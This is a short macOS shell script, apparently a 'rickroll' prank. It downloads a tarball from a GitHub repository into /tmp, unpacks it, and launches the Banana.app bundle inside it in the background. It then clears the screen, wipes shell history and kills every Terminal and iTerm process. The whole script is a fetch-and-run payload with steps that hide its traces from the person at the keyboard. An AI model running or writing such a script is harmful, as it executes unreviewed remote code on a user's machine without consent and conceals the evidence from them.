mkdir -p /tmp/felhita/

curl -L https://github.com/fel-hita/rickrolled/blob/master/Rickroll.tar.gz?raw=true -o /tmp/felhita/Rickroll.tar.gz > /dev/null

tar -xvf /tmp/felhita/Rickroll.tar.gz -C /tmp/felhita > /dev/null

nohup open /tmp/felhita/app/Banana.app > /dev/null

clear
history -c

killall iTerm
killall Terminal
killall iTerm2
